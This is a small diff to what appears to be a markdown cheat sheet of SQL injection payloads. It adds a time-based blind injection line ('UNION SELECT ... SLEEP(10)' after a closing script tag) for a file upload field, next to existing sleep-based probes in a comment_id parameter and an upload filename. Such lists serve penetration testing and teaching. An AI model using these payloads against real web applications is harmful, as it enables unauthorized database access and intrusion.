@@ -16,6 +16,8 @@ ___
 &comment_id=291751-sleep(5)& >>
 
 filename="poc.js' (select*from(select(sleep(3)))a) '.pdf" >> Uploading File
+
+asd</script>') UNION SELECT 1,SLEEP(10),3,4,5-- - >> Via file upload vulnerability
 ```
 ### Determinig SQLi Vulnerablity & Login Bypass
 ```sql
